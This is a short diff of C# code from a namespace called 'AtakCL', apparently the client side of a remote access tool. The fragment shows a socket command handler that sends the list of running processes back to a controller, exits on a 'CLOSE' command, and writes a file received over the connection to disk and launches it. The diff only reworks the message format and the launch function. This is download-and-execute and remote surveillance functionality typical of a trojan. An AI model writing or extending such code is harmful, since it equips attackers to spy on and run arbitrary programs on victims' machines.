@@ -126,7 +126,7 @@ namespace AtakCL
                             {
                                 full += p.ProcessName + "|" + p.Id + "|";                               
                             }
-                            socket.Send(Encoding.UTF8.GetBytes("PPP" + full));
+                            socket.Send(Encoding.UTF8.GetBytes(full));
                             break;
                         case "CLOSE":
                             Environment.Exit(0);
@@ -323,13 +323,9 @@ namespace AtakCL
             {
                 file.Write(fileBuff, 0, fileBuff.Length);
                 
-                Thread t = new Thread(() => startFile(path));
+                Thread t = new Thread(() => startApp(path));
                 t.Start();
             }
-        }
-        static void startFile(string path)
-        {
-            Process.Start(path);            
         }
         static void startApp(string path)
         {
